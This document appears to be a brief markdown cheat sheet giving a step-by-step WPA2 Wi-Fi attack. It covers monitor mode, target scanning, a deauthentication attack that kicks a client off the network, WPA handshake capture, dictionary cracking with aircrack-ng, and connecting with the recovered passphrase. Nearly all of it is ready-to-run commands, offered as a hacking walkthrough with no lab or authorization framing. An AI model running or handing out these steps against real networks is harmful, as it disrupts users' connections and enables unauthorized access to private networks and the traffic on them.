tested with Alfa AWUS036ACH

#### Drivers installation

```
apt install realtek-rtl88xxau-dkms
```

#### Hacking process
1. Place wireless card into monitor mode
2. Discover information about network (Channel & BSSID)
3. Select network and capture data
4. Perform deauth attack
5. Capture WPA handshake
6. Attempt to crack the handshake

#### Exploit walkthrough

Monitor mode
```
airmon-ng	
airmon-ng check
airmon-ng check kill
airmon-ng start wlan1
iw dev wlan1 info
```

Discover informations
```
airodump-ng wlan1(mon)
#BSSID is the mac address
#PWR is the distance from the device (less the number is more we are close)
#CH is the channel
#ENC is the type (here WPA2)
#ESSID is the name od the SSID, if its hidden only the length is available
```

Select network and capture data
```
airodump-ng wlan1(mon) -c 12 --bssid <BSSID> --essid <SSID> -w capture
# -c for channel
# --bssid target router
# -w filename capture
```

After that we will see the device attached to the network.
Then to capture the handshake we can wait or to speed this process we have to kick the user connected from the network.

Perform deauth attack
```
# Open a new tab
aireplay-ng -0 1 -a <BSSID> -c <client_mac_address> wlan1(mon)
# -0 means deauth and 1 = run one time 
```

Capture WPA handshake

The deauth process start, the WPA handshake should pop up in the other tab. Look at the capture.cap.

Attempt to crack the handshake
```
aircrack-ng -w <wordlist.txt> -b <BSSID> capture.cap
aircrack-ng -w /usr/share/john/password.lst -e <ESSID> -b <BSSID> wpa.cap
```

#### Connect to the network

```
airmon-ng check kill
wpa_passphrase <SSID> > ssid.conf
wpa_supplicant -i wlan0 -c ssid.conf -B # -B for background
dhclient wlan0
```